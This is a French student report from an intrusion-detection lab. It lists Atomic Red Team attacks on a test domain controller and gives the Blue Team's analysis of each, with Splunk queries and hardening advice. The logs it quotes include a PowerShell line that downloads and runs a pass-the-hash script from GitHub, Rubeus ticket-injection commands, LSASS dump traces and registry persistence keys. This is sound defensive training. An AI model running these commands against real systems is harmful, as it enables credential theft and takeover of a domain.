<div align="center">
**Rapport Détection des intrusions**
</div>

<div align="center">Promo 2027 — Groupe 5</div>

### Membres

- `kevin.monmouton@ecole2600.com`
- `nathan.cailleux@ecole2600.com`
- `antoine.adam@ecole2600.com`
- `antoine.goulin@ecole2600.com`
- `loris.danel@ecole2600.com`
- `lucas.joblin@ecole2600.com`

---
### Disclaimer

Nous avions la chance d'avoir dans notre groupe une personne qui fait de la réponse à incident dans le cadre de son alternance. Pour en tirer profit au maximum, nous avons lancé une attaque le matin et sommes tous passés en Blue Team, ce qui explique le rapport assez complet. L'après midi nous avons refait la même chose mais le rapport est moins détaillé car nous n'avons pas passé qu'il était nécéssaire de fournir un rapport de 80 pages.

### Red Team — Matin

#### Type d'attaques lancées

  - 2025-11-07T09:55:09 : Invoke-AtomicTest T1106
    - Description de la technique : T1106 — Execution through API : Exécution de code via appels API système (NTAPI). Utilisé pour lancer des payloads sans passer par binaires standards.
  
  - 2025-11-07T10:03:29 : Invoke-AtomicTest T1547-3
    - Description de la technique : T1547.003 — Boot or Logon Autostart Execution (Registry Run Keys / Startup Folder / Scheduled Task) : Persistance via mécanismes d'autostart (ici DLL custom au démarrage/connexion RDP).
  
  - 2025-11-07T10:14:40 : Invoke-AtomicTest T1574.001-2
    - Description de la technique : T1574.001 — DLL Search Order Hijacking / DLL Sideloading : Substitution/sideload de DLL pour faire exécuter du code légitime par un binaire de confiance.
  
  - 2025-11-07T10:23:00 : Invoke-AtomicTest T1003.001-12 
    - Description de la technique : T1003.001 — OS Credential Dumping: LSASS Memory : Dumping mémoire de LSASS pour extraire identifiants/jetons.
  
  - 2025-11-07T10:28:56 : Invoke-AtomicTest T1003.001-12
    - Même attaque, exécutée une seconde fois.
  
  - 2025-11-07T10:42:00 : Invoke-AtomicTest T1135-12
    - Description de la technique : T1135 — Network Share Discovery : Énumération de partages SMB pour trouver cibles de collecte/mouvement latéral.
  
  - 2025-11-07T10:48:03 : Invoke-AtomicTest T1550.002
    - Description de la technique : T1550.002 — Use Alternate Authentication Material: Pass the Hash : Réutilisation de hash NTLM pour authentifier sans mot de passe en clair.
  
  - 2025-11-07T10:53:06 : Invoke-AtomicTest T1021.001
    - Description de la technique : T1021.001 — Remote Services RDP : Utilisation de RDP pour mouvement latéral ou accès distant.
  
  - 2025-11-07T10:56:37 : Invoke-AtomicTest T1115-2
    - Description de la technique : T1115 — Clipboard Data : Vol de données via le presse-papier (GetClipboardData, utilitaires système).
      
  - 2025-11-07T10:58:48 : Invoke-AtomicTest T1132.001-3 
    - Description de la technique : T1132.001 — Data Encoding: Standard Encoding : Encodage de données (Base64/hex) avant exfiltration ou C2.
     
  - 2025-11-07T11:06:00 : Invoke-AtomicTest T1020
    - Description de la technique : T1020 — Automated Exfiltration : Exfiltration automatisée (scripts/scheduled tasks) vers destinations externes.

#### Axes d'amélioration de la Blue Team par attaque

  - T1106 (Execution through API) : renforcer les règles d'exécution et EDR pour détecter appels API suspects; appliquer AppLocker/whitelisting pour bloquer exécutions non approuvées.

  - T1547.003 (Autostart/DLL) : restreindre les droits d'écriture sur les mécanismes d'autostart, surveiller/inventorier les clés Run/Startup et activer des contrôles d'intégrité.

  - T1574.001 (DLL Sideloading) : empêcher le chargement de DLL depuis répertoires utilisateur (politiques d'exécution), appliquer contrôle d'applications et patcher les exécutables vulnérables.

  - T1003.001 (LSASS dump) : activer Credential Guard/ASR, restreindre privilèges de debug/SeDebugPrivilege, surveiller ouvertures de handles sur lsass.exe et bloquer outils de dump connus.

  - T1135 (Network Share Discovery) : désactiver l'énumération anonyme des partages, appliquer le principe du moindre privilège sur les partages et activer l'audit SMB pour détecter des scans/énumérations.

  - T1550.002 (Pass the Hash) : réduire l'usage de NTLM (préférer Kerberos/MFA), limiter l'usage d'administrateurs locaux, imposer rotation/gestion stricte des comptes et appliquer mitigations LSA.

  - T1021.001 (RDP) : restreindre l'accès RDP (VPN/RDP-Gateway), activer MFA, journaliser les connexions et surveiller modèles de sessions anormaux.

  - T1115 (Clipboard Data) : détecter accès au presse-papier par processus non interactifs via EDR, limiter l'exposition de données sensibles dans le presse-papier et contrôler processus capables d'accéder au clipboard.

  - T1132.001 (Data Encoding) : ajouter inspection des contenus sortants (reconnaissance d'objets Base64/hex), créer règles réseau/IDS pour détection d'objets encodés et journaliser transferts suspects.

  - T1020 (Automated Exfiltration) : surveiller tâches planifiées et processus en arrière-plan effectuant egress périodique, appliquer DLP/filtrage d'egress et bloquer destinations non approuvées.

### Blue Team — Matin

#### Analyse de l'événement : 2025-11-07T09:17:21Z

Scan actif de découverte de contenu web via wordlist.

Date de l’exercice : 07/11/2025  
Heure UTC : 09:17:21  
Hôte concerné : AR-WIN-DC

Analyse des alertes détectées :
Une exécution PowerShell a initié un scan actif ciblant un serveur web local (<http://localhost>) en utilisant une wordlist afin d’identifier des chemins, des fichiers ou des endpoints internes potentiels. Ce type de comportement est caractéristique d’une phase de reconnaissance applicative visant à cartographier la surface exposée d’un service web avant une exploitation potentielle.

Preuves extraites (texte visible dans l’image Splunk) :

```text
2025-11-07 09:17:21 AR-WIN-DC "powershell.exe" & {Import-Module "C:\AtomicRedTeam\atomics/T1595.003/src/WebServerScan.ps1"

Invoke-WordlistScan -Target "http://localhost" -Wordlist "C:\AtomicRedTeam\atomics/T1595.003/src/wordlist.txt" -Timeout "5" -OutputFile "$env:TMPDIR/wordlist_scan.txt"

Write-Host "Scan complete. Results saved to: $env:TMPDIR/wordlist_scan.txt"}
```

Requête Splunk utilisée pour remonter cet événement :

```splunk
index=* (Image="*\\powershell.exe" OR Image="*\\pwsh.exe")
| eval cmd=coalesce(CommandLine, Command_Line, Message)
| where cmd LIKE "%http://%" OR cmd LIKE "%https://%"
  OR cmd LIKE "%github.com%" OR cmd LIKE "%raw.githubusercontent.com%"
  OR cmd LIKE "%pastebin.com%" OR cmd LIKE "%gist.github.com%"
  OR cmd LIKE "%bitbucket.org%" OR cmd LIKE "%dropbox.com%"
  OR cmd LIKE "%.s3.amazonaws.com%" OR cmd LIKE "%cloudfront.net%"
| table _time host Account_Name cmd
| sort - _time
```

La présence d’un module PowerShell chargé dynamiquement, exécutant ensuite un scan ciblé par wordlist, constitue une anomalie claire en environnement de production AD. L’usage de `localhost` suggère une phase de reconnaissance locale en vue d’identifier des interfaces, des endpoints internes ou des services exposés.

Criticité : moyenne à élevée selon la nature applicative du service ciblé. Il s’agit d’une première étape typique précédant l’exploitation d’applications web ou l’accès indirect à des données sensibles.

Suggestions d’amélioration pour renforcer la sécurité :

Mesures préventives :

- Interdire en GPO / AppLocker l’exécution PowerShell non signée ou provenant de chemins non corporatifs.
- Restreindre l’accès aux modules PowerShell additionnels sur les DC et serveurs critiques.

Mesures de détection SIEM / EDR :

- Mettre en place un alerting sur toute commande PowerShell contenant Invoke-WordlistScan, dirb, gobuster, scan, wordlist ou target HTTP/HTTPS local.
- Détecter le pattern PowerShell + requêtes web + wordlist.

Durcissement Active Directory / réseau :

- Segmenter strictement les services web internes, idéalement isolés en DMZ ou subnet applicatif.
- Limiter la navigation HTTP/HTTPS sortante depuis les DC (egress filtering).
- Journaliser systématiquement les tentatives de scan de répertoire applicatif web interne.

#### Analyse de l'événement : 2025-11-07T10:48:15Z

Utilisation de hash NTLM pour authentification et exécution distante (Pass The Hash).

Date de l’exercice : 07/11/2025  
Heure UTC : 10:48:15  
Hôte concerné : AR-WIN-DC

Analyse des alertes détectées :
Une commande PowerShell a été détectée sur le contrôleur de domaine exécutant du code récupéré depuis une ressource externe GitHub, puis utilisant ce script pour déclencher une authentification via hash NTLM sur la même machine. Cette technique permet à un attaquant de s’authentifier sous le compte Administrator sans connaître le mot de passe en clair, en utilisant uniquement son hash NTLM. Le script récupéré permettait ensuite l’exécution d’une commande WMI distante (`hostname`) sous le contexte de l’utilisateur ciblé. Ce type d’activité est une signature forte de mouvement latéral post-compromission et constitue une phase offensive majeure permettant potentiellement de prendre le contrôle total du domaine.

Log Splunk observé :

```text
"powershell.exe" {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
IEX (IWR '<https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1>' -UseBasicParsing);
Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname}
```

Requête Splunk utilisée pour remonter cet événement :

```splunk
index=* (Image="*\\powershell.exe" OR Image="*\\pwsh.exe")
| where CommandLine LIKE "% -EncodedCommand%" OR CommandLine LIKE "%IEX%" OR CommandLine LIKE "%Invoke-Expression%" OR CommandLine LIKE "% -NoProfile%"
| table _time host Account_Name CommandLine
| sort - _time
```

Suggestions d’amélioration pour renforcer la sécurité :

Mesures préventives :

- Activer Credential Guard et la protection LSASS (`RunAsPPL`) pour compliquer la récupération de hachages NTLM.
- Bloquer les téléchargements de scripts externes depuis PowerShell sur les DC (restriction proxy, App Control, PS WebAccess restreint).
- Appliquer AppLocker ou WDAC afin d’interdire les scripts PowerShell non signés et modules chargés en mémoire via `IEX`.
- Restreindre l’utilisation des comptes Domain Admin / Administrator et privilégier des comptes administratifs éphémères.
- Restreindre l’accès réseau sortant des DC pour empêcher les téléchargements depuis `githubusercontent`, `pastebin` ou autres dépôts publics.
- Bloquer les commandes PowerShell exploitant `Invoke-Expression`, `downloadstring` ou `New-Object Net.WebClient` hors périmètre d’administration.
- Activer le Constrained Language Mode et le Script Block Logging (4104) sur les hôtes sensibles.
- Forcer `ExecutionPolicy = AllSigned` et surveiller l’usage de compilateurs comme `csc.exe` susceptibles de générer du code à la volée.

Mesures de détection SIEM / EDR :

- Surveiller toute élévation contenant `-Hash`, `sekurlsa`, `Invoke-WMIExec` ou d’autres marqueurs Pass-the-Hash.
- Alerter si un enchaînement PowerShell + téléchargement externe + authentification NTLM anormale est observé.
- Corréler les commandes incluant `iex(`, `downloadstring(` et `githubusercontent` (EventCode 4104) pour générer une alerte dédiée.
- Détecter l’utilisation de fonctions comme `CreateProcess`, `NtCreateProcess`, `VirtualAlloc` ou `VirtualProtect` dans les scripts PowerShell téléchargés.
- Identifier les appels API suspects émis par des processus non signés ou des utilisateurs non administratifs.
- Déployer une règle Sigma ciblant `powershell.exe` lorsque la ligne de commande combine `iex`, `downloadstring` et les chaînes `CreateProcess|WinPwn|System`.

Durcissement Active Directory / réseau :

- Automatiser la rotation des secrets NTLM et auditer régulièrement les comptes privilégiés.
- Interdire les connexions sortantes directes des DC vers Internet et filtrer les téléchargements de scripts via proxy.
- Appliquer le principe du moindre privilège pour les comptes administratifs, avec mots de passe locaux uniques par machine.
- Surveiller les détections EDR liées à l’usage de syscalls directs ou au contournement de hooks API par PowerShell.

#### Analyse de l'événement : 2025-11-07T10:03:19Z

Persistance via clé de registre Run détournée.

Date de l’exercice : 07/11/2025  
Heure UTC : 10:03:19  
Hôte concerné : AR-WIN-DC

Analyse des alertes détectées :
L’analyse des journaux Sysmon indique qu’un processus `reg.exe` a été exécuté avec des privilèges élevés (`NT AUTHORITY\SYSTEM`) afin de modifier une clé de registre Windows permettant la persistance automatique au démarrage. L’attaquant a créé une nouvelle entrée dans la base de registre au sein du chemin `HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\AddIns\Malware`, associée à la valeur `C:\Windows\System32\amsi.dll`. Cette action vise à exécuter ou charger une bibliothèque malveillante (`amsi.dll`) à chaque ouverture de session utilisateur ou lors de l’utilisation du client RDP, ce qui permet une exécution automatique sans interaction de l’utilisateur.

Preuves extraites (texte visible dans l’image) :

```text
EventID=1 | Provider=Microsoft-Windows-Sysmon
CommandLine="reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\AddIns\Malware" /v Name /t REG_SZ /d "C:\Windows\System32\amsi.dll" /f"
Image="C:\Windows\System32\reg.exe"
ParentCommandLine="cmd.exe /c reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\AddIns\Malware" /v Name /t REG_SZ /d "C:\Windows\System32\amsi.dll" /f"
User="NT AUTHORITY\SYSTEM"
LogonId=0x37e
IntegrityLevel=System
Hashes=MD5=EB201194F02EE572DC5A850885B4C12, SHA256=C61A68C1654F59108164C8DF6154F40CBAD8208AC1B83EACF9E84484F7A4986C
```

Requête Splunk utilisée pour remonter cet événement :

```splunk
index=* (EventCode=4688 OR EventCode=1)
(Image="*reg.exe" OR Image="*powershell.exe" OR Image="*cmd.exe")
CommandLine="*reg*"
| sort _time
```

Le processus parent `cmd.exe` a invoqué `reg.exe` pour ajouter une clé personnalisée dans le registre utilisateur. Le registre cible (`HKCU\Software\Microsoft\Terminal Server Client\Default\AddIns`) est normalement utilisé pour les extensions RDP ; ici, il a été abusé pour charger une DLL système détournée (`amsi.dll`). L’exécution sous contexte SYSTEM prouve une compromission avancée avec élévation de privilèges. La modification de ce registre entraîne une persistance assurée à chaque connexion via le client RDP. Ce comportement correspond à une technique de persistance par clé Run/Startup Folder, souvent utilisée pour maintenir un accès après redémarrage ou session distante. Le détournement de la DLL légitime `amsi.dll` est également suspect : elle est normalement utilisée par Windows pour la détection antivirale des scripts PowerShell. Sa redirection pourrait neutraliser la protection AMSI.

Criticité : Élevée — modification du registre en contexte SYSTEM, persistance assurée au démarrage, potentielle neutralisation de la sécurité du système.

Suggestions d’amélioration pour renforcer la sécurité :

Mesures préventives :

- Restreindre l’accès en écriture au registre pour les chemins sensibles (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run*`, `HKCU\Software\Microsoft\Terminal Server Client\Default\AddIns*`).
- Activer l’audit des modifications du registre (Audit Registry Changes via GPO).
- Bloquer l’exécution de `reg.exe` et `cmd.exe` pour les utilisateurs standards via AppLocker ou WDAC.
- Surveiller l’intégrité de `C:\Windows\System32\amsi.dll` (hash connu de référence).

Mesures de détection SIEM / EDR :

- Créer une règle d’alerte Splunk détectant `reg add` ou `Set-ItemProperty` contenant les chemins Run, RunOnce ou `Terminal Server Client\Default\AddIns`.
- Corréler avec un contexte `User=SYSTEM` ou Administrator.
- Détecter toute modification d’`amsi.dll` hors mises à jour Windows.
- Configurer Sysmon pour tracer les modifications du registre (`EventID 13`) avec filtrage sur `HKCU\Software\Microsoft\Terminal Server Client\*`.

Durcissement Active Directory / réseau :

- Interdire les connexions RDP directes vers les serveurs de rôle AD et DC.
- Restreindre les droits d’administration locale aux comptes de service dédiés.
- Mettre en place une supervision centralisée des journaux Sysmon pour détecter toute activité `reg.exe` anormale.
- Activer AMSI Logging et Microsoft Defender avec surveillance renforcée de la DLL AMSI.


#### Analyse de l'événement : 2025-11-07T10:14:41Z

Hijacking de DLL via redirection environnementale pour exécution discrète.

Date de l’exercice : 07/11/2025  
Heure UTC : 10:14:41  
Hôte concerné : AR-WIN-DC

Analyse des alertes détectées :
Les journaux montrent une tentative de détourner le chargement d’une DLL système afin de forcer Windows à charger une DLL modifiée à la place de celle normalement utilisée. Cela permet à l’attaquant d’exécuter du code arbitraire de manière transparente à chaque lancement d’application utilisant .NET ou PowerShell. Dans les traces visibles, le registre a été utilisé pour définir la variable d’environnement `APPX_PROCESS` avec la valeur `1`, tout en copiant et renommant `amsi.dll` sous forme d’une autre DLL (`WinAppXRT.dll`) dans des chemins privilégiés afin qu’elle soit chargée automatiquement par le système.

Extraits de preuves visibles dans les événements et images :

```text
reg add "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /t REG_EXPAND_SZ /d "1" /f
copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll &copy %APPDATA%\WinAppXRT.dll &copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll
User="NT AUTHORITY\SYSTEM"
Hashes=MD5=EB201194AF500E275DC5A8558854C12
ParentImage=cmd.exe
ParentCommandLine="cmd.exe /c copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll & copy %APPDATA%\amsi.dll %APPDATA%\WinAppXRT.dll & copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll"
Image="C:\Windows\System32\reg.exe"
```

Contexte critique supplémentaire : intégrité SYSTEM, exécution côté contrôleur de domaine, abus AMSI (bypass potentiel du scanning anti-malware). Cette action vise clairement à garantir de la persistance avec détournement du flux d’exécution Windows en contournant les mécanismes de défense.

Requête Splunk utilisée pour remonter cet événement :

```splunk
index=* (EventCode=4688 OR EventCode=1)
(Image="*reg.exe" OR Image="*powershell.exe" OR Image="*cmd.exe")
CommandLine="*reg*"
| sort _time
```

Suggestions d’amélioration pour renforcer la sécurité :

Mesures préventives :

- Interdire la modification des variables d’environnement critiques (`APPX_PROCESS`, `DOTNET_STARTUP_HOOKS`…) depuis des comptes non administratifs.
- Interdire l’écriture dans `System32` depuis tous les comptes hors comptes systèmes contrôlés.
- Durcir les ACL sur `HKCU\Environment` et `HKCU\Software\Microsoft\Windows\CurrentVersion\Run*`.

Mesures de détection SIEM / EDR :

- Alerter toute présence de `reg add` modifiant `Environment` avec des variables exécutables.
- Coupler la détection : modification du registre + copie de DLL vers `System32`.
- Déclencher une alerte lorsqu’une DLL système est dupliquée dans `%APPDATA%` avec un autre nom.

Durcissement Active Directory / réseau :

- Interdire l’accès Internet direct depuis les DC.
- Utiliser AppLocker ou WDAC pour bloquer l’exécution de binaires non signés depuis `%APPDATA%`.
- Surveiller l’intégrité des DLL critiques (`amsi.dll`, `WinAppXRT.dll`…) via hashing centralisé.


#### Analyse de l'événement : 2025-11-07T10:23:36Z

Tentative d’extraction de crédentials via dump mémoire LSASS.

Date de l’exercice : 07/11/2025  
Heure UTC : 10:23:36  
Hôte concerné : AR-WIN-DC

Analyse des alertes détectées :
Un bloc PowerShell a été exécuté sur le contrôleur de domaine puis des fichiers de dump LSASS ont été créés dans un répertoire temporaire lié au mécanisme SilentProcessExit. Les sorties montrent clairement des minidumps produits par `WerFault.exe` après invocation d’un utilitaire de dump (`nanodump.x64.exe`). Le comportement correspond à une tentative de récupération de la mémoire du processus `lsass.exe` — action typiquement utilisée pour extraire des credentials en clair, des hashes NTLM ou des jetons de session.

Preuves extraites :

```text
C:\Users\ADMINI~1\AppData\Local\Temp\SilentProcessExit\lsass.exe-(PID-676)-43317171\lsass.exe-(PID-676).dmp 1 2025-11-07 10:23:36 NT AUTHORITY\SYSTEM C:\Windows\system32\WerFault.exe

C:\Users\ADMINI~1\AppData\Local\Temp\SilentProcessExit\lsass.exe-(PID-676)-43317171\nanodump.x64.exe-(PID-6504).dmp 1 2025-11-07 10:23:38 NT AUTHORITY\SYSTEM C:\Windows\system32\WerFault.exe
```

Éléments détectés dans les logs SIEM : EventCode 4104 (PowerShell) sur AR-WIN-DC avec exécution d’un script aboutissant à la création des dumps à 2025-11-07T10:23:36Z.

Requête Splunk utilisée pour remonter cet événement :

```splunk
index=* EventCode=11
| eval file=coalesce(TargetFilename, TargetFile, File)
| where isnotnull(file) AND like(file, "%Temp%")
| stats count latest(_time) as last_seen values(Host) as hosts values(User) as users values(Image) as processes by file
| sort - last_seen
```

Processus parent apparent pour la création des dumps : `C:\Windows\system32\WerFault.exe` exécuté en `NT AUTHORITY\SYSTEM`.

Interprétation : l’attaquant (ou l’action automatisée malveillante) a déclenché une création de dump LSASS via le mécanisme Silent Process Exit (`WerFault`), produisant des fichiers `.dmp` en `Temp`. Ces dumps permettent une analyse hors ligne (`mimikatz`, `pypykatz`) et peuvent révéler des credentials de comptes de domaine. L’exécution revient à SYSTEM et se déroule sur un DC → impact élevé.

Criticité : Haute — extraction de LSASS sur contrôleur de domaine = risque immédiat de vol de credentials et mouvement latéral.

Suggestions d’amélioration pour renforcer la sécurité :

Mesures préventives :

- Activer LSA Protection (`RunAsPPL`) et Windows Defender Credential Guard sur les contrôleurs de domaine pour rendre la lecture directe de LSASS plus difficile.
- Restreindre l’exécution de processus système légitimes (`WerFault.exe`) afin qu’ils ne puissent pas créer de dumps depuis des comptes non approuvés ; limiter la possibilité d’écrire des exécutables/dumps depuis des répertoires temporaires.
- Déployer AppLocker ou WDAC pour interdire l’exécution de binaires non signés depuis les répertoires `Temp` et profils utilisateurs.
- Bloquer l’accès Internet direct pour les contrôleurs de domaine (egress filtering) et restreindre les téléchargements de scripts externes via PowerShell.

Mesures de détection SIEM / EDR :

- Créer une règle corrélée prioritaire :
  - condition : création de fichier contenant `lsass` ou pattern `*lsass*.dmp` dans un répertoire `Temp` + processus parent `WerFault.exe` OU `nanodump/xordump/nanodump.x64.exe` détecté ;
  - action : alerte critique et isolation automatique recommandée.
- Détecter et alerter sur PowerShell (EventCode 4104) contenant des commandes qui modifient Silent Process Exit, exécutent `MiniDump`, ou téléchargent des outils de dumping (`nanodump`, `xordump`, `procdump`, `Out-Minidump.ps1`).
- Journaliser et corréler : PowerShell 4104 / ProcessCreate 4688 / FileCreate (EventCode 11 ou Sysmon 11) pour capturer rapidement les chaînes d’exécution.
- Surveiller les créations de dumps dans des chemins non standards (ex : `%LocalAppData%\Temp\SilentProcessExit\*`, `%TEMP%\*`) en tant qu’indicateur anormal sur DC.

Mesures de réponse et procédures opérationnelles :

- En cas de détection : isoler immédiatement l’hôte (segment réseau), capturer mémoire et image disque si possible, collecter les dumps produits pour analyse forensique (hash SHA256), puis conserver comme preuve.
- Rechercher des compromissions corrélées : logons anormaux, exécutions PowerShell sur d’autres hôtes, transferts de fichiers sortants.
- Procéder à la rotation d’identifiants sensibles si le dump confirme l’exfiltration de credentials (appliquer les procédures de gestion de crise AD).
- Mettre en place une chasse proactive : rechercher occurrences historiques de fichiers `*lsass*.dmp`, `nanodump`, `xordump`, `WerFault` en contexte non standard.

#### Analyse de l'événement : 2025-11-07T10:28:21Z

Tentative d’extraction de crédentials via dump mémoire LSASS.

Date de l’exercice : 07/11/2025  
Heure UTC : 10:28:21  
Hôte concerné : AR-WIN-DC

Analyse des alertes détectées :
Une activité critique a été détectée impliquant une exécution PowerShell privilégiée sur le contrôleur de domaine. L’événement montre l’invocation d’une commande visant directement le processus LSASS afin de générer un fichier dump dans le répertoire temporaire Windows. Quelques secondes plus tard, un fichier nommé `C:\Windows\Temp\lsass-xordump.t1003.001.dmp` a été créé par le processus `xordump.exe` exécuté avec l’identité `NT AUTHORITY\SYSTEM`. Cette action correspond à un scénario hautement offensif classique : extraction de secrets de LSASS permettant ensuite la récupération de mots de passe, hash NTLM et matériel de session pouvant être réutilisé pour mouvement latéral ou élévation de privilèges.

Points critiques :

- l’action se produit directement sur un DC ;
- elle est réalisée par SYSTEM ;
- elle écrit un dump mémoire de LSASS sur disque ;
- elle contourne les vecteurs classiques (pas de crash LSASS, pas d’erreur WER).

Requête Splunk utilisée pour remonter cet événement :

```text
C:\Windows\Temp\lsass-xordump.t1003.001.dmp 1 2025-11-07 10:28:23 NT AUTHORITY\SYSTEM C:\Windows\Temp\xordump.exe
```

Recherche SPL utilisée pour repérer le dump en `Temp` :

```splunk
index=* EventCode=11
| eval file=coalesce(TargetFilename, TargetFile, File)
| where isnotnull(file) AND like(file, "%Temp%")
| stats count latest(_time) as last_seen values(Host) as hosts values(User) as users values(Image) as processes by file
| sort - last_seen
```

Suggestions d’amélioration pour renforcer la sécurité :

Mesures préventives :

- Interdire la possibilité de création de dump mémoire LSASS via GPO ou registre (`RunAsPPL`, Credential Guard activé, blocage Silent Process Exit abusif, désactivation `WDigest` si non utile).
- Appliquer une restriction stricte sur les groupes et comptes pouvant exécuter des binaires administratifs sur contrôleurs de domaine. SYSTEM ne doit jamais être exposé à des chemins d’exécutables non standard.

Mesures de détection SIEM / EDR :

- Activer la journalisation avancée PowerShell (ScriptBlockLogging + ModuleLogging + Transcription) sur les DC afin de garder une copie complète des commandes.
- Déployer des contrôles EDR bloquant par défaut toute écriture d’un `.dmp` contenant `lsass` dans `Temp`, même si signature/chemin inconnu.
- Mettre en place des alertes Splunk corrélées : PowerShell 4104 + création `.dmp` + processus SYSTEM = alerte critique immédiate / containment obligatoire.
- Surveiller les accès à `LSASS.exe` via ETW/EDR dédiés (process handle access audit activé).

Durcissement Active Directory / réseau :

- Restreindre la surface d’exécution en autorisant uniquement les exécutables whitelistés via WDAC/AppLocker dans `C:\Windows\Temp\` (aucun exécutable ne doit pouvoir être lancé depuis `Temp`).


#### Analyse de l'événement : 2025-11-07T10:44:11Z

Tentative de découverte de partages réseau internes (Network Share Discovery).

Date de l’exercice : 07/11/2025  
Heure UTC : 10:44:11  
Hôte concerné : AR-WIN-DC

Analyse des alertes détectées :
Un événement PowerShell (EventCode 4104) a été observé sur le contrôleur de domaine impliquant l’exécution d’une commande téléchargeant un binaire tiers visant l’énumération automatisée de partages réseau accessibles. Cette activité est généralement utilisée par un attaquant dans une phase de reconnaissance interne afin d’identifier des sources de données exploitables, des points de pivot potentiels et des serveurs sensibles exposant des ressources SMB internes. L’événement capturé démontre l’intention d’introduire un outil dédié d’exploration de shares au sein de l’infrastructure, preuve d’une étape préparatoire à un mouvement latéral et/ou une recherche de données critiques.

Logs Splunk observés :

```text
{New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "<https://github.com/SnaffCon/Snaffler/releases/download/1.0.150/Snaffler.exe>" -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Snaffler.exe"}
```

Requête Splunk utilisée pour remonter cet événement :

```splunk
index=* (EventCode=4104 OR EventCode=4103 OR EventCode=4688)
| eval Command=coalesce(ScriptBlockText, CommandLine, _raw)
| where match(Command, "(?i)base64") OR match(Command, "(?i)b64encode") OR match(Command, "(?i)Invoke-WebRequest") OR match(Command, "(?i)-bxor") OR match(Command, "(?i)echo -n .*\| base64")
| stats count latest(_time) as last_seen values(Computer) as hosts values(Account_Name) as users by Command
| sort - count
```

Cette activité démontre un indicateur sérieux de reconnaissance interne ciblant l’inventaire des shares accessibles depuis le DC lui-même.

Suggestions d’amélioration pour renforcer la sécurité :

Mesures préventives :

- Bloquer ou filtrer toute commande PowerShell impliquant `Invoke-WebRequest` depuis les contrôleurs de domaines, sauf liste blanche explicite.
- Déployer des règles EDR interdisant l’exécution de binaires non signés ou non référencés depuis des répertoires non standards (`Temp`, profils utilisateur, dossiers custom).
- Appliquer AppLocker ou WDAC pour empêcher l’exécution d’outils destinés à l’exploration réseau interne.
- Renforcer le cloisonnement SMB inter-serveurs, réduire les surfaces d’accès aux shares internes et limiter l’exploration réseau depuis les DC.
- Mettre en place un contrôle réseau egress strict sur les DC (aucun accès Internet par défaut).

Mesures de détection SIEM / EDR :

- Surveiller et alerter en priorité :
  - découverte de shares réseau ;
  - énumérations SMB atypiques ;
  - téléchargements externes exécutés depuis un DC.
- Déployer une corrélation Splunk automatique (PowerShell + téléchargement de binaire + DC) générant une alerte critique immédiate.

Durcissement Active Directory / réseau :

- Formaliser des playbooks de réponse et des revues régulières des partages exposés pour prévenir les abus de reconnaissance réseau.


#### Analyse de l'événement : 2025-11-07T10:48:38Z

Pass-The-Ticket Kerberos sur DC.

Date de l’exercice : 07/11/2025  
Heure UTC : 10:48:38  
Hôte concerné : AR-WIN-DC

Analyse des alertes détectées :
L’événement montre l’utilisation d’un mécanisme Kerberos Pass-The-Ticket permettant d’obtenir un TGT depuis un hôte cible puis de l’injecter localement afin de générer un accès sur un service réseau sans connaissance réelle du mot de passe initial. Les éléments visibles dans l’extrait montrent très clairement l’usage de `PsExec.exe` pour exécuter à distance, la récupération du TGT en fichier `.kirbi` et l’usage d’un binaire Kerberos afin d’effectuer l’injection de ticket.

Extraits visibles dans l’image :

```text
&"C:\...ExternalPayloads\PsExec.exe" -accepteula \\localhost -w c:\ -c "C:\...ExternalPayloads\rubeus.exe" asktgt /user:Administrator /password:Password /domain:$Env:USERDOMAIN /outfile:ticket.kirbi
Set-Location "C:\AtomicRedTeam\atomics\...\ExternalPayloads"
Move-Item -Force "\\\localhost\c$\ticket.kirbi" ticket.kirbi
Write-Host "Successfully retrieved TGT from 'localhost', now requesting a TGS from local"
&"C:\...ExternalPayloads\rubeus.exe" asktgs /service:cifs/localhost /ticket:ticket.kirbi /ptt
```

L’attaquant obtient ici un TGT puis réalise une demande TGS localement, permettant d’abuser d’un accès CIFS sur `localhost` via `/ptt`. C’est un vecteur critique, particulièrement dangereux sur DC car il autorise du mouvement latéral silencieux même si le mot de passe n’a pas été obtenu.

Requête Splunk utilisée pour remonter cet événement :

```splunk
index=* (EventCode=4688 OR EventCode=1)
(
  Image="*klist.exe"
  OR Image="*Rubeus.exe"
  OR Image="*mimikatz*"
  OR CommandLine="*kerberos*"
  OR CommandLine="*/ptt*"
  OR CommandLine="*tgt*"
  OR CommandLine="*ticket*"
)
```

Suggestions d’amélioration pour renforcer la sécurité :

Mesures préventives :

- Interdire `PsExec` et autres remote exec tools hors bastion autorisé.
- Utiliser LAPS avec échéance courte sur comptes administrateurs locaux.
- Assurer la rotation régulière du secret `KRBTGT`.

Mesures de détection SIEM / EDR :

- Alerter sur toute création ou transfert de fichier `.kirbi`.
- Alerter sur toute commande Kerberos contenant `/ptt` ou `asktgt`.
- Lier les événements `Rubeus`/`PsExec` sur DC en criticité haute.

Durcissement Active Directory / réseau :

- Segmenter les DC et interdire l’accès direct aux shares administratifs `C$` depuis le réseau utilisateur.
- Basculer vers Credential Guard + Protected Users si possible.
- Mettre en place un double contrôle PAM / Just-In-Time Access pour les droits Domain Admin.


#### Analyse de l'événement : 2025-11-07T10:51:15Z

Découverte de comptes locaux.

Date de l’exercice : 07/11/2025  
Heure UTC : 10:51:15  
Hôte concerné : AR-WIN-DC

**Analyse des alertes détectées**
